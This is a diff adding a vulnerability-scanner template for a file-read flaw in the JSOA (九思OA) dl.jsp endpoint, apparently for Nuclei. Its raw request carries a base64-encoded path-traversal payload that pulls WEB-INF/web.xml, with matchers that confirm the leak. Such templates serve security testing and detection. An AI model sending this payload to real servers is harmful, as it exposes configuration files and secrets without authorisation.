@@ -1,0 +1,28 @@
+id: jsoa-dl-fileread
+
+info:
+  name: JSOA dl.jsp - File Read
+  author: qwtd
+  severity: high
+  tags: 九思OA
+
+http:
+  - raw:
+      - |
+        POST /jsoa/dl.jsp?JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "web-app"
+          - "display-name"
+        condition: and
+      - type: status
+        status:
+          - 200
